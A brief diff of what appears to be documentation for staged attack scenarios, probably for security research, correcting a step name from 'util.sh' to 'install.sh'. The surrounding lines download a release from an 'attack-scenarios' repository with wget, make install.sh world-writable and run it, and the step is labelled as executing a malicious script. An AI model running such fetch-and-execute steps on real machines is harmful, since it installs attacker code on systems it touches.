@@ -88,10 +88,10 @@ wget https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb
 chmod 777 install.sh
 ./install.sh
 ```
-2. Execute malicious `util.sh`
+2. Execute malicious `install.sh`
 
 ```
-util.sh
+./install.sh
 ```
 
 **Exploit (Attacker IP2)**    
